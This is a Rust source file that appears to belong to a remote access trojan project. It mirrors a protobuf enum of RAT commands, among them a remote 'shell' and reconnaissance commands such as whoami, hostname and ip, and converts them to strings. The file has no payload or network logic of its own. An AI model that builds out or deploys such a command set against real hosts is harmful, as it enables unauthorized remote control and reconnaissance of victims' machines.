use crate::rat::RatCommand;

pub mod rat {
    tonic::include_proto!("rat");
}

// Hacky copy of the protobuf in rat.rs
pub enum RsRatCommand {
    Cadence = 0,
    Dir = 1,
    Hostname = 2,
    Ip = 3,
    Ls = 4,
    None = 5,
    Os = 6,
    Quit = 7,
    Shell = 8,
    Whoami = 9,
}

// Way to convert the hacky copy of the protobuf to a string slice
impl From<RsRatCommand> for &str {
    fn from(rat_command: RsRatCommand) -> Self {
        match rat_command {
            RsRatCommand::Cadence => "cadence",
            RsRatCommand::Dir => "dir",
            RsRatCommand::Hostname => "hostname",
            RsRatCommand::Ip => "ip",
            RsRatCommand::Ls => "ls",
            RsRatCommand::None => "none",
            RsRatCommand::Os => "os",
            RsRatCommand::Quit => "quit",
            RsRatCommand::Shell => "shell",
            RsRatCommand::Whoami => "whoami",
        }
    }
}

// Way to convert from the protobuf enum into the hacky copy of the protobuf
impl From<RatCommand> for RsRatCommand {
    fn from(command: RatCommand) -> Self {
        match command {
            RatCommand::Cadence => RsRatCommand::Cadence,
            RatCommand::Dir => RsRatCommand::Dir,
            RatCommand::Hostname => RsRatCommand::Hostname,
            RatCommand::Ip => RsRatCommand::Ip,
            RatCommand::Ls => RsRatCommand::Ls,
            RatCommand::None => RsRatCommand::None,
            RatCommand::Os => RsRatCommand::Os,
            RatCommand::Quit => RsRatCommand::Quit,
            RatCommand::Shell => RsRatCommand::Shell,
            RatCommand::Whoami => RsRatCommand::Whoami,
        }
    }
}